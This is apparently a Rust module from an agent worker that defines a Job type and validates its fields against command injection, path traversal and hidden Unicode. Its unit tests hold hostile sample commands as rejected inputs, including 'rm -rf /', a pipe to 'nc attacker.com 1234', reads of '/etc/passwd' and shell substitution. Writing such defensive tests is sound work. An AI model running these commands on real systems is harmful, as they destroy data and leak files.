use crate::error::{AgwError, AgwResult};
use serde::{Deserialize, Serialize};

/// Maximum length for job ID
const MAX_JOB_ID_LEN: usize = 128;
/// Maximum length for plan ID
const MAX_PLAN_ID_LEN: usize = 128;
/// Maximum length for tool name
const MAX_TOOL_LEN: usize = 64;
/// Maximum length for command
const MAX_COMMAND_LEN: usize = 4096;
/// Maximum number of arguments
const MAX_ARGS_COUNT: usize = 256;
/// Maximum length for a single argument
const MAX_ARG_LEN: usize = 4096;
/// Minimum timeout in seconds
const MIN_TIMEOUT_SECS: u64 = 1;
/// Maximum timeout in seconds (24 hours)
const MAX_TIMEOUT_SECS: u64 = 86400;

/// Dangerous Unicode characters (bidirectional overrides, zero-width)
const DANGEROUS_UNICODE: &[char] = &[
    '\u{202A}', // LEFT-TO-RIGHT EMBEDDING
    '\u{202B}', // RIGHT-TO-LEFT EMBEDDING
    '\u{202C}', // POP DIRECTIONAL FORMATTING
    '\u{202D}', // LEFT-TO-RIGHT OVERRIDE
    '\u{202E}', // RIGHT-TO-LEFT OVERRIDE
    '\u{200B}', // ZERO WIDTH SPACE
    '\u{200C}', // ZERO WIDTH NON-JOINER
    '\u{200D}', // ZERO WIDTH JOINER
    '\u{FEFF}', // ZERO WIDTH NO-BREAK SPACE
];

/// Job step to be executed by the worker
///
/// Jobs are fetched from AGQ via BRPOP on the `queue:ready` list.
/// Each job contains a step to execute deterministically.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Job {
    /// Unique job identifier
    pub id: String,

    /// Plan identifier this job belongs to
    pub plan_id: String,

    /// Step number within the plan
    pub step_number: u32,

    /// Tool to execute (e.g., "unix", "agx-ocr")
    pub tool: String,

    /// Command or instruction for the tool
    pub command: String,

    /// Optional arguments for the command
    #[serde(default)]
    pub args: Vec<String>,

    /// Optional timeout in seconds
    #[serde(default)]
    pub timeout: Option<u64>,
}

impl Job {
    /// Create a new job
    #[must_use]
    #[allow(dead_code)] // Used in tests
    pub fn new(
        id: String,
        plan_id: String,
        step_number: u32,
        tool: String,
        command: String,
    ) -> Self {
        Self {
            id,
            plan_id,
            step_number,
            tool,
            command,
            args: Vec::new(),
            timeout: None,
        }
    }

    /// Parse a job from JSON string
    ///
    /// # Errors
    ///
    /// Returns an error if the JSON is invalid or doesn't match the Job schema
    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }

    /// Serialize job to JSON string
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails
    #[allow(dead_code)] // Used in tests
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }

    /// Validate job fields for security and sanity
    ///
    /// # Errors
    ///
    /// Returns an error if any field fails validation
    pub fn validate(&self) -> AgwResult<()> {
        // Validate job ID
        validate_string_field(&self.id, "job ID", MAX_JOB_ID_LEN, true)?;

        // Validate plan ID
        validate_string_field(&self.plan_id, "plan ID", MAX_PLAN_ID_LEN, true)?;

        // Validate tool name - alphanumeric, hyphens, underscores only
        if self.tool.is_empty() {
            return Err(AgwError::Worker("Tool name cannot be empty".to_string()));
        }
        if self.tool.len() > MAX_TOOL_LEN {
            return Err(AgwError::Worker(format!(
                "Tool name exceeds maximum length of {MAX_TOOL_LEN}"
            )));
        }
        if !self
            .tool
            .chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
        {
            return Err(AgwError::Worker(
                "Tool name can only contain alphanumeric characters, hyphens, and underscores"
                    .to_string(),
            ));
        }

        // Validate command
        validate_string_field(&self.command, "command", MAX_COMMAND_LEN, false)?;
        check_for_dangerous_patterns(&self.command, "command")?;

        // Validate arguments
        if self.args.len() > MAX_ARGS_COUNT {
            return Err(AgwError::Worker(format!(
                "Arguments count exceeds maximum of {MAX_ARGS_COUNT}"
            )));
        }
        for (i, arg) in self.args.iter().enumerate() {
            validate_string_field(arg, &format!("argument {i}"), MAX_ARG_LEN, false)?;
            check_for_dangerous_patterns(arg, &format!("argument {i}"))?;
        }

        // Validate timeout
        if let Some(timeout) = self.timeout {
            if timeout < MIN_TIMEOUT_SECS {
                return Err(AgwError::Worker(format!(
                    "Timeout must be at least {MIN_TIMEOUT_SECS} second(s)"
                )));
            }
            if timeout > MAX_TIMEOUT_SECS {
                return Err(AgwError::Worker(format!(
                    "Timeout exceeds maximum of {MAX_TIMEOUT_SECS} seconds"
                )));
            }
        }

        Ok(())
    }
}

/// Validate a string field
fn validate_string_field(
    value: &str,
    field_name: &str,
    max_len: usize,
    alphanumeric_only: bool,
) -> AgwResult<()> {
    if value.is_empty() {
        return Err(AgwError::Worker(format!("{field_name} cannot be empty")));
    }

    if value.len() > max_len {
        return Err(AgwError::Worker(format!(
            "{field_name} exceeds maximum length of {max_len}"
        )));
    }

    // Check for control characters
    if value.chars().any(char::is_control) {
        return Err(AgwError::Worker(format!(
            "{field_name} contains invalid control characters"
        )));
    }

    // Check for null bytes
    if value.contains('\0') {
        return Err(AgwError::Worker(format!(
            "{field_name} contains null bytes"
        )));
    }

    // Check for dangerous Unicode characters (bidirectional overrides, zero-width)
    for ch in DANGEROUS_UNICODE {
        if value.contains(*ch) {
            return Err(AgwError::Worker(format!(
                "{field_name} contains dangerous Unicode character"
            )));
        }
    }

    if alphanumeric_only
        && !value
            .chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
    {
        return Err(AgwError::Worker(format!(
            "{field_name} can only contain alphanumeric characters, hyphens, and underscores"
        )));
    }

    Ok(())
}

/// Check for dangerous command injection patterns
fn check_for_dangerous_patterns(value: &str, field_name: &str) -> AgwResult<()> {
    // Check for command injection attempts
    let dangerous_chars = ['&', '|', ';', '$', '`', '\n', '\r'];
    for ch in dangerous_chars {
        if value.contains(ch) {
            return Err(AgwError::Worker(format!(
                "{field_name} contains dangerous character: '{ch}'"
            )));
        }
    }

    // Check for path traversal - be precise to avoid false positives
    if value.contains("../") || value.contains("..\\") || value.starts_with("..") {
        return Err(AgwError::Worker(format!(
            "{field_name} contains path traversal sequence"
        )));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_job_creation() {
        let job = Job::new(
            "job-123".to_string(),
            "plan-456".to_string(),
            1,
            "unix".to_string(),
            "echo hello".to_string(),
        );

        assert_eq!(job.id, "job-123");
        assert_eq!(job.plan_id, "plan-456");
        assert_eq!(job.step_number, 1);
        assert_eq!(job.tool, "unix");
        assert_eq!(job.command, "echo hello");
        assert!(job.args.is_empty());
        assert_eq!(job.timeout, None);
    }

    #[test]
    fn test_job_json_serialization() {
        let job = Job::new(
            "job-123".to_string(),
            "plan-456".to_string(),
            1,
            "unix".to_string(),
            "echo hello".to_string(),
        );

        let json = job.to_json().unwrap();
        let parsed = Job::from_json(&json).unwrap();

        assert_eq!(job, parsed);
    }

    #[test]
    fn test_job_with_args() {
        let json = r#"{
            "id": "job-123",
            "plan_id": "plan-456",
            "step_number": 2,
            "tool": "agx-ocr",
            "command": "extract",
            "args": ["--lang", "eng", "image.png"],
            "timeout": 30
        }"#;

        let job = Job::from_json(json).unwrap();

        assert_eq!(job.id, "job-123");
        assert_eq!(job.tool, "agx-ocr");
        assert_eq!(job.args, vec!["--lang", "eng", "image.png"]);
        assert_eq!(job.timeout, Some(30));
    }

    #[test]
    fn test_job_optional_fields() {
        let json = r#"{
            "id": "job-123",
            "plan_id": "plan-456",
            "step_number": 1,
            "tool": "unix",
            "command": "ls"
        }"#;

        let job = Job::from_json(json).unwrap();

        assert!(job.args.is_empty());
        assert_eq!(job.timeout, None);
    }

    #[test]
    fn test_job_invalid_json() {
        let json = r#"{"invalid": "json"}"#;
        assert!(Job::from_json(json).is_err());
    }

    // Security validation tests
    #[test]
    fn test_job_validation_success() {
        let job = Job::new(
            "job-123".to_string(),
            "plan-456".to_string(),
            1,
            "unix".to_string(),
            "echo hello".to_string(),
        );
        assert!(job.validate().is_ok());
    }

    #[test]
    fn test_job_validation_command_injection() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo hello; rm -rf /".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_pipe_injection() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "cat file | nc attacker.com 1234".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_backtick_injection() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo `whoami`".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_dollar_injection() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo $(whoami)".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_path_traversal() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "cat ../../etc/passwd".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_args_injection() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "grep".to_string(),
            args: vec!["pattern".to_string(), "file; rm -rf /".to_string()],
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_excessive_length() {
        let long_command = "a".repeat(5000);
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: long_command,
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_invalid_tool_name() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "bad;tool".to_string(),
            command: "echo hello".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_null_bytes() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo\0null".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_control_characters() {
        let job = Job {
            id: "job\n-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo hello".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_excessive_timeout() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo hello".to_string(),
            args: Vec::new(),
            timeout: Some(999_999),
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_too_many_args() {
        let args: Vec<String> = (0..300).map(|i| format!("arg{i}")).collect();
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo".to_string(),
            args,
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_unicode_bidi_override() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo \u{202E}danger".to_string(), // RIGHT-TO-LEFT OVERRIDE
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_zero_width_characters() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo\u{200B}hidden".to_string(), // ZERO WIDTH SPACE
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_legitimate_dots() {
        // This should PASS - "1..10" is legitimate (Ruby-style range)
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo 1..10".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_ok());
    }

    #[test]
    fn test_job_validation_path_traversal_with_slash() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "cat ../etc/passwd".to_string(),
            args: Vec::new(),
            timeout: None,
        };
        assert!(job.validate().is_err());
    }

    #[test]
    fn test_job_validation_zero_timeout() {
        let job = Job {
            id: "job-123".to_string(),
            plan_id: "plan-456".to_string(),
            step_number: 1,
            tool: "unix".to_string(),
            command: "echo hello".to_string(),
            args: Vec::new(),
            timeout: Some(0),
        };
        assert!(job.validate().is_err());
    }
}
